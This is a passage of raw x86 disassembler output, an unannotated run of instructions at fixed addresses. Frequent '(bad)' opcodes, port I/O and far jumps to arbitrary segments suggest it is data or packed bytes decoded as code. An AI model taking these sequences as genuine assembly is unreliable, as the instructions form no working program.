  6ba40e:	fnstsw WORD PTR [eax+0x5a]
  6ba411:	jl     0x6ba3c8
  6ba413:	or     ebp,esi
  6ba415:	cdq    
  6ba416:	xlat   BYTE PTR ds:[ebx]
  6ba417:	or     al,bl
  6ba419:	std    
  6ba41a:	fs pop esi
  6ba41c:	ins    DWORD PTR es:[edi],dx
  6ba41d:	mov    dl,0x92
  6ba41f:	sbb    cl,BYTE PTR [eax+ebx*4-0x66]
  6ba423:	pop    esp
  6ba424:	pop    esp
  6ba425:	lock int3 
  6ba427:	lahf   
  6ba428:	retf   0x54d1
  6ba42b:	jg     0x6ba3c8
  6ba42d:	or     eax,0x419cf2a3
  6ba432:	(bad)  
  6ba433:	cdq    
  6ba434:	ret    0xecf2
  6ba437:	adc    eax,0x3098efd8
  6ba43c:	fistp  WORD PTR [eax+0x1bda9c71]
  6ba442:	inc    ebp
  6ba443:	sbb    dh,ch
  6ba445:	leave  
  6ba446:	adc    eax,0x6f4f3541
  6ba44b:	clc    
  6ba44c:	jmp    0x6ba43a
  6ba44e:	fisub  DWORD PTR [edi+0x71]
  6ba451:	xor    eax,0xab6611ad
  6ba456:	ja     0x6ba473
  6ba458:	cs adc eax,0x7f6895f8
  6ba45e:	sub    BYTE PTR [eax-0x22],bh
  6ba461:	push   esp
  6ba462:	(bad)  
  6ba463:	mov    eax,0xb28fbfce
  6ba468:	ret    
  6ba469:	dec    ebx
  6ba46a:	sbb    eax,edx
  6ba46c:	pusha  
  6ba46d:	inc    eax
  6ba46e:	add    al,0xdb
  6ba471:	out    0x35,al
  6ba473:	mov    ah,0xa
  6ba475:	add    esi,ebp
  6ba477:	push   esp
  6ba478:	ds jbe 0x6ba4c2
  6ba47b:	jl     0x6ba461
  6ba47d:	jmp    0x6c44d578
  6ba482:	js     0x6ba42f
  6ba484:	and    al,0x15
  6ba486:	clc    
  6ba487:	js     0x6ba41a
  6ba489:	hlt    
  6ba48a:	test   eax,0xe1080248
  6ba48f:	popa   
  6ba490:	xchg   BYTE PTR [eax-0x7d],bl
  6ba493:	push   ss
  6ba494:	jo     0x6ba50e
  6ba496:	cld    
  6ba497:	aam    0x83
  6ba499:	pop    edi
  6ba49a:	xor    ch,0x8f
  6ba49d:	adc    edx,DWORD PTR [edi]
  6ba49f:	xchg   ecx,eax
  6ba4a0:	ja     0x6ba487
  6ba4a2:	stos   BYTE PTR es:[edi],al
  6ba4a3:	dec    ecx
  6ba4a4:	fnstcw WORD PTR [edx]
  6ba4a6:	or     bh,BYTE PTR [ecx-0x3bdc236d]
  6ba4ac:	iret   
  6ba4ad:	mov    ecx,DWORD PTR [esp+edi*8-0x1a235618]
  6ba4b4:	jnp    0x6ba4fb
  6ba4b6:	js     0x6ba534
  6ba4b8:	adc    DWORD PTR [edx],0xffffffe7
  6ba4bb:	push   ebx
  6ba4bc:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  6ba4be:	bound  edi,QWORD PTR [edx+0x16]
  6ba4c1:	fldcw  WORD PTR [eax]
  6ba4c3:	sub    ch,dl
  6ba4c5:	(bad)  
  6ba4c6:	pusha  
  6ba4c7:	inc    esi
  6ba4c8:	cmp    ecx,DWORD PTR [ebx]
  6ba4ca:	mov    eax,ds:0x53eaf313
  6ba4cf:	leave  
  6ba4d0:	adc    edi,DWORD PTR [eax-0x2128011a]
  6ba4d6:	xchg   edx,eax
  6ba4d7:	add    ebp,edi
  6ba4d9:	fiadd  WORD PTR [eax+0x38]
  6ba4dc:	push   cs
  6ba4dd:	ja     0x6ba4c3
  6ba4df:	or     DWORD PTR [edi-0x5d8f9a6f],ebp
  6ba4e5:	scas   al,BYTE PTR es:[edi]
  6ba4e6:	add    eax,0x92380e58
  6ba4eb:	out    dx,eax
  6ba4ec:	mov    ds:0xb81decf0,al
  6ba4f1:	xchg   ecx,eax
  6ba4f2:	adc    ecx,DWORD PTR [esi]
  6ba4f4:	xchg   ebp,eax
  6ba4f5:	jmp    0xf6853087
  6ba4fa:	jno    0x6ba56d
  6ba4fc:	jge    0x6ba51e
  6ba4fe:	test   al,0x39
  6ba500:	push   esi
  6ba501:	loopne 0x6ba557
  6ba503:	inc    ebp
  6ba504:	xchg   BYTE PTR [ecx+edx*4-0x245ccf12],bl
  6ba50b:	mov    ds:0x15e65759,eax
  6ba510:	push   es
  6ba511:	adc    al,0xf1
  6ba513:	cmp    al,0x6a
  6ba515:	popf   
  6ba516:	mov    cl,0x28
  6ba518:	cld    
  6ba519:	test   al,0x6d
  6ba51b:	mov    eax,0xa18ba6c
  6ba520:	fadd   DWORD PTR [eax]
  6ba522:	test   al,0x19
  6ba524:	nop
  6ba525:	jne    0x6ba5a0
  6ba527:	jae    0x6ba4b7
  6ba529:	push   ds
  6ba52a:	cmp    DWORD PTR [ebx+0x2b],0xcc678447
  6ba531:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6ba532:	jmp    0x60156e19
  6ba537:	pop    DWORD PTR [esi+ecx*4]
  6ba53a:	jo     0x6ba57c
  6ba53c:	scas   al,BYTE PTR es:[edi]
  6ba53d:	out    dx,al
  6ba53e:	jge    0x6ba528
  6ba540:	ss call 0x6ec0:0xb0c372b3
  6ba548:	jge    0x8c9329e0
  6ba54e:	mov    WORD PTR cs:[ebx-0x6124c6b2],ds
  6ba555:	bswap  ebx
  6ba557:	pop    es
  6ba558:	xchg   edi,eax
  6ba559:	cwde   
  6ba55a:	push   ecx
  6ba55b:	mov    al,0x1a
  6ba55d:	adc    cl,cl
  6ba55f:	and    eax,0xe943ecda
  6ba564:	out    0x4e,eax
  6ba566:	aam    0x1d
  6ba568:	jne    0x6ba59b
  6ba56a:	in     al,dx
  6ba56b:	icebp  
  6ba56c:	jb     0x6ba553
  6ba56e:	call   0xc925:0x7961369
  6ba575:	(bad)  
  6ba576:	adc    ebp,esp
  6ba578:	sbb    al,0xdd
  6ba57a:	jbe    0x6ba5ee
  6ba57c:	mov    ecx,0x1e33b7a4
  6ba581:	jle    0x6ba598
  6ba583:	cs sbb edi,ebx
  6ba586:	loop   0x6ba5ee
  6ba588:	test   al,bh
  6ba58a:	fucomi st,st(0)
  6ba58c:	cmp    edi,DWORD PTR [ecx]
  6ba58e:	fst    DWORD PTR ds:0x91492a10
  6ba594:	xchg   ebp,eax
  6ba595:	or     BYTE PTR [eax],ch
  6ba597:	sub    BYTE PTR [edi-0x6b],dl
  6ba59a:	mov    esp,0x722b18f
  6ba59f:	mov    al,ds:0x7a8d7ede
  6ba5a4:	pop    esp
  6ba5a5:	je     0x6ba53e
  6ba5a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6ba5a8:	ret    
  6ba5a9:	mov    bh,0xfd
  6ba5ab:	jbe    0x6ba537
  6ba5ad:	adc    al,0x15
  6ba5af:	test   BYTE PTR [edx-0x66],0x45
  6ba5b3:	in     eax,dx
  6ba5b4:	shl    BYTE PTR [ecx-0x7f1cdc2b],cl
  6ba5ba:	jmp    0x6ba5e9
  6ba5bc:	sahf   
  6ba5bd:	push   ebx
  6ba5be:	xchg   edi,eax
  6ba5bf:	push   ebx
  6ba5c0:	mov    dh,dh
  6ba5c2:	inc    ebp
  6ba5c3:	fldenv [ebx+0x30ccd58e]
  6ba5c9:	fwait
  6ba5ca:	mov    ecx,DWORD PTR [ebx*1+0x5858b986]
  6ba5d1:	std    
  6ba5d2:	inc    DWORD PTR [edx-0x12b2e7d8]
  6ba5d8:	push   ecx
  6ba5d9:	push   0x1d
  6ba5db:	test   al,0x64
  6ba5dd:	push   0xffffffac
  6ba5df:	sub    bh,BYTE PTR [edx+0x68]
  6ba5e2:	mov    ds:0x311c3f82,eax
  6ba5e7:	inc    edx
  6ba5e8:	retf   
  6ba5e9:	dec    esi
  6ba5ea:	mov    di,0x6e8f
  6ba5ee:	jecxz  0x6ba5af
  6ba5f0:	daa    
  6ba5f1:	jge    0x6ba57d
  6ba5f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6ba5f4:	call   0x5c38:0xf62438fb
  6ba5fb:	mov    al,0xbc
  6ba5fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6ba5fe:	sahf   
  6ba5ff:	lods   al,BYTE PTR ds:[esi]
  6ba600:	mov    dh,0x5a
  6ba602:	data16 lods al,BYTE PTR ds:[esi]
  6ba604:	mov    cl,0x94
  6ba606:	push   ds
  6ba607:	call   0xb40c:0x898ec4d3
  6ba60e:	aas    
  6ba60f:	call   0x41c76184
  6ba614:	fs lahf 
  6ba616:	fdivr  DWORD PTR [ecx+0x5d]
  6ba619:	mov    ebx,es
  6ba61b:	mov    ecx,0xb674979c
  6ba620:	out    0xab,al
  6ba622:	pushf  
  6ba623:	scas   al,BYTE PTR es:[edi]
  6ba624:	push   cs
  6ba625:	mov    dl,0xbe
  6ba627:	jb     0x6ba62b
  6ba629:	dec    ebp
  6ba62a:	jle    0x6ba5bd
  6ba62c:	ja     0x6ba5ee
  6ba62e:	in     al,dx
  6ba62f:	das    
  6ba630:	bt     DWORD PTR [edi-0x59426c06],edi
  6ba637:	fisubr DWORD PTR [ebx]
  6ba639:	cmp    BYTE PTR [ecx-0x76],dh
  6ba63c:	mov    ebp,DWORD PTR [eax+0x6b]
  6ba63f:	or     ecx,0xffffff90
  6ba642:	lea    edx,[edx+0x3288c0b2]
  6ba648:	fdivr  st(7),st
  6ba64a:	dec    edx
  6ba64b:	push   0xbf705ba2
  6ba650:	pusha  
  6ba651:	loope  0x6ba699
  6ba653:	xchg   esi,esi
  6ba655:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6ba656:	xabort 0x95
  6ba659:	and    BYTE PTR [edx-0x6555cbe6],ch
  6ba65f:	icebp  
  6ba660:	lods   eax,DWORD PTR ds:[esi]
  6ba661:	sbb    DWORD PTR [esi+edi*4],edx
  6ba664:	popa   
  6ba665:	sbb    dl,BYTE PTR [eax]
  6ba667:	test   ebp,edi
  6ba669:	cmc    
  6ba66a:	scas   al,BYTE PTR es:[edi]
  6ba66b:	push   ebp
  6ba66c:	inc    edx
  6ba66d:	mov    al,ds:0xde02a331
  6ba672:	mov    ds:0x2afe6099,al
  6ba677:	xchg   ebx,eax
  6ba678:	xor    ebx,0x3074ba45
  6ba67e:	pusha  
  6ba67f:	sbb    BYTE PTR [edi-0x1],0x83
  6ba683:	daa    
  6ba684:	mov    bh,0xf7
  6ba686:	sbb    bh,bl
  6ba688:	xor    DWORD PTR [esi+ebp*2+0x54],ebx
  6ba68c:	mov    WORD PTR [edx-0x1b1b3df7],gs
  6ba692:	cmp    al,0xa
  6ba694:	fs stos BYTE PTR es:[edi],al
  6ba696:	cmp    edi,DWORD PTR [esi+esi*1]
  6ba699:	add    bl,BYTE PTR ss:[eax+0x126402ee]
  6ba6a0:	iret   
  6ba6a1:	sbb    ah,BYTE PTR [esi+0x1036309]
  6ba6a7:	sbb    eax,0xfe22dccc
  6ba6ac:	in     al,0x5f
  6ba6ae:	mov    edi,0x2e0dfb05
  6ba6b3:	es or  eax,0x4a769a05
  6ba6b9:	mov    ebp,0x7105418f
  6ba6be:	push   ds
  6ba6bf:	sbb    DWORD PTR [edx-0x36],0x54
  6ba6c3:	cmp    al,0x6c
  6ba6c5:	ja     0x6ba656
  6ba6c7:	outs   dx,BYTE PTR ds:[esi]
  6ba6c8:	jmp    0xf2a42ec6
  6ba6cd:	and    eax,0x86f71e56
  6ba6d2:	and    BYTE PTR [eax],bl
  6ba6d4:	mov    edx,gs
  6ba6d6:	stos   DWORD PTR es:[edi],eax
  6ba6d7:	or     BYTE PTR [edx],bl
  6ba6d9:	sbb    al,0xfe
  6ba6db:	in     al,0x46
  6ba6dd:	outs   dx,BYTE PTR ds:[esi]
  6ba6de:	aaa    
  6ba6df:	jecxz  0x6ba73b
  6ba6e1:	push   ebp
  6ba6e2:	mov    cl,BYTE PTR [ebx]
  6ba6e4:	js     0x6ba6c0
  6ba6e6:	xchg   ebx,eax
  6ba6e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6ba6e8:	cld    
  6ba6e9:	pop    ebx
  6ba6ea:	pop    es
  6ba6eb:	xchg   esi,eax
  6ba6ec:	sbb    esp,DWORD PTR [edx]
  6ba6ee:	fwait
  6ba6ef:	lods   al,BYTE PTR ds:[esi]
  6ba6f0:	mov    bl,0xe5
  6ba6f2:	jmp    0x6ba6aa
  6ba6f4:	pop    esi
  6ba6f5:	test   DWORD PTR [ebp-0x2b9240d2],esi
  6ba6fb:	div    BYTE PTR [ebx]
  6ba6fd:	and    DWORD PTR [edi-0x43a46770],edx
  6ba703:	mov    esi,esi
  6ba705:	lock outs dx,BYTE PTR ds:[esi]
  6ba707:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6ba708:	ficomp WORD PTR [ecx-0x1e34e4d2]
  6ba70e:	mov    ebx,DWORD PTR [edx]
  6ba710:	mov    eax,ds:0xe1632d6e
  6ba715:	mov    cl,0xb2
  6ba717:	sub    ebp,esi
  6ba719:	mov    edx,fs
  6ba71b:	(bad)  
  6ba71c:	hlt    
  6ba71d:	imul   esi,eax,0x29
  6ba720:	push   eax
  6ba721:	push   es
  6ba722:	mov    esi,0xb1a03548
  6ba727:	(bad)  
  6ba728:	iret   
  6ba729:	ins    BYTE PTR es:[edi],dx
  6ba72a:	pop    ebx
  6ba72b:	mov    al,ds:0x737d5a73
  6ba730:	loopne 0x6ba79e
  6ba732:	pop    ss
  6ba733:	jge    0x6ba7a3
  6ba735:	or     al,0x6b
  6ba737:	nop
  6ba738:	retf   0x7405
  6ba73b:	jg     0x6ba793
  6ba73d:	xor    al,BYTE PTR [edx+0x66]
  6ba740:	cdq    
  6ba741:	std    
  6ba742:	fdivp  st(5),st
  6ba744:	jb     0x6ba6fb
  6ba746:	and    esi,DWORD PTR [ebx+0xa]
  6ba749:	mov    bl,0x24
  6ba74b:	jg     0x6ba767
  6ba74d:	js     0x6ba742
  6ba74f:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  6ba751:	xchg   edx,eax
  6ba752:	cs xor al,0xc8
  6ba755:	repz sar DWORD PTR [eax-0x5],cl
  6ba759:	mov    ebp,0x884f2f74
  6ba75e:	inc    edx
  6ba75f:	mov    dh,0x35
  6ba761:	ja     0x6ba7d4
  6ba763:	adc    ah,BYTE PTR [ecx+0x7f]
  6ba766:	lahf   
  6ba767:	mov    BYTE PTR [esi],ch
  6ba769:	stos   DWORD PTR es:[edi],eax
  6ba76a:	ror    BYTE PTR [edi],0x6d
  6ba76d:	imul   esi,DWORD PTR [edx],0xffffff97
  6ba770:	inc    esi
  6ba771:	jmp    0xc1fbe964
  6ba776:	push   eax
  6ba777:	xlat   BYTE PTR ds:[ebx]
  6ba778:	or     al,0xd5
  6ba77a:	(bad)  
  6ba77b:	leave  
  6ba77c:	xchg   edi,eax
  6ba77d:	sti    
  6ba77e:	ret    0xbb1
  6ba781:	jp     0x6ba7ea
  6ba783:	lods   al,BYTE PTR ds:[esi]
  6ba784:	sub    al,0x1a
  6ba786:	sar    DWORD PTR [ebp+0x6bffab01],1
  6ba78c:	dec    esp
  6ba78d:	rcr    DWORD PTR [edi-0x78e94a9b],0x2c
  6ba794:	stos   DWORD PTR es:[edi],eax
  6ba795:	test   al,0x60
  6ba797:	popf   
  6ba798:	das    
  6ba799:	cmp    al,0x31
  6ba79b:	xchg   ecx,eax
  6ba79c:	loop   0x6ba752
  6ba79e:	mov    edi,0xfca704df
  6ba7a3:	mov    cl,0xfd
  6ba7a5:	xor    BYTE PTR [edi+0x583b1387],bh
  6ba7ab:	inc    esi
  6ba7ac:	and    dl,BYTE PTR [edx-0x748b3b20]
  6ba7b2:	(bad)  
  6ba7b3:	mov    al,0xac
  6ba7b5:	out    dx,al
  6ba7b6:	pop    esi
  6ba7b7:	(bad)  
  6ba7b8:	and    al,0x26
  6ba7ba:	lds    ebx,FWORD PTR [edi]
  6ba7bc:	ins    DWORD PTR es:[edi],dx
  6ba7bd:	std    
  6ba7be:	hlt    
  6ba7bf:	xchg   esp,eax
  6ba7c0:	push   edx
  6ba7c1:	(bad)  
  6ba7c2:	jmp    0x8df701e2
  6ba7c7:	mov    dl,0xd7
  6ba7c9:	mov    ebp,0x142fd16c
  6ba7ce:	mov    eax,0x7c884430
  6ba7d3:	jle    0x6ba795
  6ba7d5:	stos   BYTE PTR es:[edi],al
  6ba7d6:	push   ebp
  6ba7d7:	aad    0x8c
  6ba7d9:	and    DWORD PTR [esi+0x421643bd],ebp
  6ba7df:	loop   0x6ba78e
  6ba7e1:	aam    0x16
  6ba7e3:	mov    ebx,0x88624976
  6ba7e8:	ds in  al,dx
  6ba7ea:	push   0x4ac3ac0f
  6ba7ef:	icebp  
  6ba7f0:	sahf   
  6ba7f1:	mov    BYTE PTR [ebx],ah
  6ba7f3:	aam    0x9b
  6ba7f5:	rcl    DWORD PTR [ebp-0x28],1
  6ba7f8:	pop    ebx
  6ba7f9:	fdiv   QWORD PTR [ecx+0x72bc65e2]
  6ba7ff:	call   0xa713:0x7f288ff5
  6ba806:	xlat   BYTE PTR ds:[ebx]
  6ba807:	mov    ds:0xa05823f8,eax
  6ba80c:	pop    edx
  6ba80d:	dec    eax
  6ba80e:	push   esi
  6ba80f:	push   ebx
  6ba810:	pushf  
  6ba811:	mov    eax,0x1475cc47
  6ba816:	xor    eax,0x891dcd68
  6ba81b:	aas    
  6ba81c:	sbb    al,0x1e
  6ba81e:	sub    al,0x8
  6ba821:	mov    DWORD PTR [ebx+0x52],eax
  6ba824:	mov    ah,0xe
  6ba826:	xor    DWORD PTR [esi-0x368ee4b],edx
  6ba82c:	loopne 0x6ba823
  6ba82e:	and    BYTE PTR [ebx+0x467687e4],cl
  6ba834:	sar    esi,1
  6ba836:	jl     0x6ba7f8
  6ba838:	fsubr  DWORD PTR [edx+edx*8+0x78]
  6ba83c:	leave  
  6ba83d:	push   ecx
  6ba83e:	imul   edx,DWORD PTR [edi-0x44],0x2
  6ba842:	jle    0x6ba819
  6ba844:	inc    edi
  6ba845:	push   ecx
  6ba846:	(bad)  
  6ba847:	into   
  6ba848:	pop    ecx
  6ba849:	sbb    bh,dh
  6ba84b:	and    edx,DWORD PTR [ecx+0x65]
  6ba84e:	sbb    dl,0x30
  6ba851:	mov    ebx,0xa765e37e
  6ba856:	add    eax,0xc4778045
  6ba85b:	lock xlat BYTE PTR ds:[ebx]
  6ba85d:	pop    edi
  6ba85e:	js     0x6ba829
  6ba860:	sbb    BYTE PTR [eax-0x16],ch
  6ba863:	mov    al,ds:0x7b21d675
  6ba868:	in     eax,dx
  6ba869:	std    
  6ba86a:	test   BYTE PTR [edx+0x17],al
  6ba86d:	adc    al,0xcc
  6ba86f:	jo     0x6ba839
  6ba871:	xchg   esp,eax
  6ba872:	fcmovnu st,st(4)
  6ba874:	xor    al,0x7f
  6ba876:	hlt    
  6ba877:	out    0x3f,eax
  6ba879:	ficomp DWORD PTR [eax-0x51dcc7]
  6ba87f:	and    ah,BYTE PTR [esi+ecx*1]
  6ba882:	fldenv [eax]
  6ba884:	scas   al,BYTE PTR es:[edi]
  6ba885:	push   edi
  6ba886:	int3   
  6ba887:	loope  0x6ba8a3
  6ba889:	fldcw  WORD PTR [ecx+0x5a]
  6ba88c:	loop   0x6ba860
  6ba88e:	fldcw  WORD PTR [edi]
  6ba890:	xchg   DWORD PTR [ebp+0x5b62957d],esi
  6ba896:	test   eax,0x70ad9f24
  6ba89b:	push   0xffffffc5
  6ba89d:	nop
  6ba89e:	fcom   QWORD PTR [ebp+0x4]
  6ba8a1:	inc    BYTE PTR [eax]
  6ba8a3:	mov    ds:0x6a3f21b8,al
  6ba8a8:	pushf  
  6ba8a9:	xor    al,0x6c
  6ba8ab:	xor    DWORD PTR [edx-0x1779a005],ecx
  6ba8b1:	in     eax,0x25
  6ba8b3:	add    dl,BYTE PTR [eax+0x28]
  6ba8b6:	push   ebp
  6ba8b7:	(bad)  [eax-0x50]
  6ba8ba:	xchg   ebx,eax
  6ba8bb:	jno    0x6ba893
  6ba8bd:	ror    DWORD PTR [edi],cl
  6ba8bf:	inc    eax
  6ba8c0:	stos   BYTE PTR es:[edi],al
  6ba8c1:	xor    BYTE PTR [edi+0x35e97b8f],bl
  6ba8c7:	loop   0x6ba854
  6ba8c9:	and    eax,0x114e17f7
  6ba8ce:	std    
  6ba8cf:	jl     0x6ba872
  6ba8d1:	cmp    ecx,DWORD PTR [edi-0x69b49666]
  6ba8d7:	popa   
  6ba8d8:	jae    0x6ba8f3
  6ba8da:	push   eax
  6ba8db:	dec    eax
  6ba8dc:	cmc    
  6ba8dd:	in     eax,dx
  6ba8de:	cmp    dh,al
  6ba8e0:	push   ss
  6ba8e1:	fwait
  6ba8e2:	popf   
  6ba8e3:	jne    0x6ba900
  6ba8e5:	cs inc esp
  6ba8e7:	cmp    eax,0xd77612dc
  6ba8ec:	div    DWORD PTR [ecx]
  6ba8ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6ba8ef:	jb     0x6ba939
  6ba8f1:	push   eax
  6ba8f2:	fstp   DWORD PTR [edi+0x1a545649]
  6ba8f8:	mov    eax,0xaac8401d
  6ba8fd:	fwait
  6ba8fe:	outs   dx,BYTE PTR ds:[esi]
  6ba8ff:	cwde   
  6ba900:	bound  edi,QWORD PTR [ebp-0x22aa786d]
  6ba906:	mov    al,0x2a
  6ba908:	pop    ss
  6ba909:	cld    
  6ba90a:	jl     0x6ba956
  6ba90c:	xchg   edi,eax
  6ba90d:	icebp  
  6ba90e:	cmp    BYTE PTR [ebp+0x64],0xf6
  6ba912:	bound  ebx,QWORD PTR [eax-0x505bc58c]
  6ba918:	in     eax,dx
  6ba919:	(bad)  
  6ba91a:	(bad)  
  6ba91b:	jle    0x6ba915
  6ba91d:	sbb    DWORD PTR [ecx-0x10],ebx
  6ba920:	adc    eax,0x7cf0c0de
  6ba925:	lahf   
  6ba926:	xchg   ebx,eax
  6ba927:	cli    
  6ba928:	or     al,0x74
  6ba92a:	nop
  6ba92b:	test   ebp,esi
  6ba92d:	popf   
  6ba92e:	neg    BYTE PTR [ebx+0xd061a8a]
  6ba934:	adc    eax,0x6e77087a
  6ba939:	cmp    DWORD PTR [esi+esi*4+0x3a],0x608a01d5
  6ba941:	out    dx,al
  6ba942:	mov    edx,0xa23dde5d
  6ba947:	(bad)  
  6ba948:	or     DWORD PTR [ebx],ebx
  6ba94a:	lahf   
  6ba94b:	pop    ss
  6ba94c:	or     al,0x9a
  6ba94e:	lods   al,BYTE PTR ds:[esi]
  6ba94f:	and    al,0x9b
  6ba951:	(bad)  
  6ba952:	icebp  
  6ba953:	sbb    DWORD PTR [ebx+edi*2-0x54],ebx
  6ba957:	xor    eax,0x6dc54dd6
  6ba95c:	daa    
  6ba95d:	fimul  WORD PTR [ecx+ecx*2-0x217bd3b0]
  6ba964:	jmp    0xcdff:0xe6090b1b
  6ba96b:	cmp    eax,0x2530abe4
  6ba970:	in     al,dx
  6ba971:	jmp    0x6ba9aa
  6ba973:	pusha  
  6ba974:	cmp    bh,ch
  6ba976:	imul   ebp,DWORD PTR [ebx-0xc],0x68
  6ba97a:	shr    edx,1
  6ba97c:	aam    0xa7
  6ba97e:	adc    esi,ebp
  6ba980:	rcr    DWORD PTR [eax-0x3ff63a87],0x40
  6ba987:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6ba988:	stc    
  6ba989:	jle    0x6ba9aa
  6ba98b:	popf   
  6ba98c:	out    dx,eax
  6ba98d:	pop    esi
  6ba98e:	inc    esp
  6ba98f:	push   edx
  6ba990:	mov    ecx,0xbdbdb566
  6ba995:	mov    esp,ebx
  6ba997:	loopne 0x6baa02
  6ba999:	sub    DWORD PTR [ebp-0x5a98443c],0xffffff92
  6ba9a0:	popf   
  6ba9a1:	mov    ah,0xf
  6ba9a3:	mov    eax,ds:0xf564eaa
  6ba9a8:	add    al,0x10
  6ba9aa:	inc    ecx
  6ba9ab:	jb     0x6ba956
  6ba9ad:	jne    0x6ba9a9
  6ba9af:	retf   
  6ba9b0:	mov    esp,0x5ed6cda1
  6ba9b5:	push   0xffffff9a
  6ba9b7:	xchg   esi,eax
  6ba9b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6ba9b9:	icebp  
  6ba9ba:	nop
  6ba9bb:	(bad)  
  6ba9bc:	popf   
  6ba9bd:	jo     0x6ba954
  6ba9bf:	cli    
  6ba9c0:	cdq    
  6ba9c1:	pop    edx
  6ba9c2:	jge    0x6baa06
  6ba9c4:	jl     0x6ba99c
  6ba9c6:	stos   DWORD PTR es:[edi],eax
  6ba9c7:	fmul   DWORD PTR [eax]
  6ba9c9:	out    0x6a,al
  6ba9cb:	sahf   
  6ba9cc:	(bad)  
  6ba9cd:	cli    
  6ba9ce:	es and eax,0x93987e5e
  6ba9d4:	mov    ch,0x10
  6ba9d6:	or     dl,cl
  6ba9d8:	out    dx,al
  6ba9d9:	or     al,0xe7
  6ba9db:	mov    WORD PTR [edi],ds
  6ba9dd:	mov    bh,0xe4
  6ba9df:	inc    ebx
  6ba9e0:	(bad)  
  6ba9e1:	fld    DWORD PTR [edi]
  6ba9e3:	mov    ebp,0xf981ccbc
  6ba9e8:	sub    ebx,DWORD PTR [esi]
  6ba9ea:	or     eax,esi
  6ba9ec:	loopne 0x6baa12
  6ba9ee:	mov    dl,0x49
  6ba9f0:	rcl    BYTE PTR [esi+0x1],1
  6ba9f3:	dec    esi
  6ba9f4:	xchg   esi,eax
  6ba9f5:	push   cs
  6ba9f6:	jmp    0x97d4102f
  6ba9fb:	pop    eax
  6ba9fc:	test   al,0x5f
  6ba9fe:	mov    cl,0x25
  6baa00:	sbb    BYTE PTR [esi],dh
  6baa02:	jp     0x6ba9e1
  6baa04:	jmp    0x2d1b:0x29f9c714
  6baa0b:	lock sbb DWORD PTR [ebx],ebx
  6baa0e:	ins    DWORD PTR es:[edi],dx
  6baa0f:	jo     0x6baa09
  6baa11:	mov    ds:0x45301daa,al
  6baa16:	aaa    
  6baa17:	test   BYTE PTR [eax],ch
  6baa19:	inc    ecx
  6baa1a:	cmp    DWORD PTR [edx+esi*1+0x4821f55c],esi
  6baa21:	gs dec ebx
  6baa23:	mov    ch,0x5d
  6baa25:	or     BYTE PTR [ebp+ecx*1+0x68],bl
  6baa29:	sbb    eax,0xefa15d9b
  6baa2e:	pop    ecx
  6baa2f:	and    al,0x1d
  6baa31:	cmp    ebp,DWORD PTR [eax+eax*1]
  6baa34:	mov    al,ds:0x244621c3
  6baa39:	cmp    eax,0xa47d115
  6baa3e:	dec    ecx
  6baa3f:	sub    DWORD PTR [esi+0x26bde91c],ebx
  6baa45:	ds jb  0x6baa6a
  6baa48:	test   eax,ebx
  6baa4a:	je     0x6baa92
  6baa4c:	inc    esp
  6baa4d:	outs   dx,DWORD PTR ds:[esi]
  6baa4e:	out    dx,eax
  6baa4f:	mov    bl,0xa1
  6baa51:	sbb    edi,DWORD PTR [ebp-0x10ca73f2]
  6baa57:	cli    
  6baa58:	pop    esp
  6baa59:	mov    al,0x1d
  6baa5b:	sub    DWORD PTR ds:0xcb1840a7,ecx
  6baa61:	jb     0x6baac2
  6baa63:	in     eax,0x41
  6baa65:	addr16 mov edx,es
  6baa68:	cdq    
  6baa69:	pop    ds
  6baa6a:	leave  
  6baa6b:	loop   0x6baa25
  6baa6d:	inc    ecx
  6baa6e:	push   es
  6baa6f:	xor    dh,BYTE PTR [edx]
  6baa71:	(bad)  
  6baa72:	mov    ah,0x1a
  6baa74:	xchg   ecx,eax
  6baa75:	popf   
  6baa76:	iret   
  6baa77:	push   ss
  6baa78:	pop    ds
  6baa79:	inc    eax
  6baa7a:	fs test dl,bh
  6baa7d:	dec    eax
  6baa7e:	inc    esi
  6baa7f:	xchg   BYTE PTR [esi+0x6d],ch
  6baa82:	sbb    ebx,DWORD PTR [ecx]
  6baa84:	mov    edx,0xa446b3ab
  6baa89:	test   BYTE PTR [ebp-0x127227c3],ch
  6baa8f:	(bad)  
  6baa90:	in     eax,0x29
  6baa92:	jne    0x6baad2
  6baa94:	aad    0x80
  6baa96:	xor    BYTE PTR [esp+esi*4+0x4f],ah
  6baa9a:	test   BYTE PTR [edx+ebx*4],bh
  6baa9d:	pop    edx
  6baa9e:	pushw  ds
  6baaa0:	adc    DWORD PTR [esi-0x79f4be9a],eax
  6baaa6:	jecxz  0x6baa6f
  6baaa8:	aaa    
  6baaa9:	pop    ecx
  6baaaa:	xchg   ecx,eax
  6baaab:	std    
  6baaac:	test   BYTE PTR [ebx+0x62],bh
  6baaaf:	cmc    
  6baab0:	mov    bh,0xdd
  6baab2:	loope  0x6baa82
  6baab4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6baab5:	sub    bl,BYTE PTR [edi+0x290aa30d]
  6baabb:	rol    dl,1
  6baabd:	test   DWORD PTR [esi-0x77],esp
  6baac0:	outs   dx,BYTE PTR ds:[esi]
  6baac1:	clc    
  6baac2:	mov    BYTE PTR [edx-0x7f4082de],dl
  6baac8:	xor    BYTE PTR [ecx-0x13555a07],0x33
  6baacf:	lahf   
  6baad0:	popf   
  6baad1:	fldenv [ebp-0x1a]
  6baad4:	stos   BYTE PTR es:[edi],al
  6baad5:	fadd   DWORD PTR [ebp+eiz*1+0x13]
  6baad9:	and    ah,al
  6baadb:	jns    0x6bab11
  6baadd:	clc    
  6baade:	inc    ecx
  6baadf:	repz adc al,0xf4
  6baae2:	(bad)  
  6baae3:	bound  edx,QWORD PTR [esi]
  6baae5:	call   0xd53a:0x49eeb7ce
  6baaec:	sub    eax,0xc58d75c0
  6baaf1:	arpl   WORD PTR [eax],bp
